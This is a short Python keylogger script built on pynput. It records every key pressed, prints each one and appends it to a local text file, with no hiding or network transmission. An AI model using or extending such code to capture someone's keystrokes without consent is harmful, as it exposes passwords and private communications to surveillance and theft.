from pynput import keyboard

def keyPressed(key):
    print(str(key))  
    with open("keyfile.txt", 'a') as logkey:
        try:
            char = key.char  
            logkey.write(char) 
        except AttributeError:
            
            logkey.write(f'[{str(key)}]')

if __name__ == "__main__":
    with keyboard.Listener(on_press=keyPressed) as listener:
        listener.join() 
